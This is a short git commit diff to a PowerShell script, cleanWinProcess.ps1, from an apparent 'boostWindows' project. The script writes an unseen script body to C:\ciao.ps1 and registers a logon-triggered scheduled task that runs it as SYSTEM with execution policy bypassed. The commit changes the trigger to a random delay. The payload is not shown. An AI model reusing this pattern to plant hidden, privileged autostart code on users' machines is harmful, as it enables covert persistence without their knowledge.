dd453cc5c14100db61044fcdfe3a85df7dffcae3
boostWindows <closecompany.yt@gmail.com>
2025-05-08 23:48:32 +0200

    Update cleanWinProcess.ps1

--- cleanWinProcess.ps1
+++ cleanWinProcess.ps1
@@ -6,7 +6,7 @@ $contenuto | Out-File "C:\ciao.ps1"
 
 $scriptPath = "C:\ciao.ps1"
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
-$trigger = New-ScheduledTaskTrigger -AtLogOn -Delay (New-TimeSpan -Seconds 30)
+$trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Seconds 30)
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
 Register-ScheduledTask -TaskName "CleanWinProcess" -Action $action -Trigger $trigger -Principal $principal
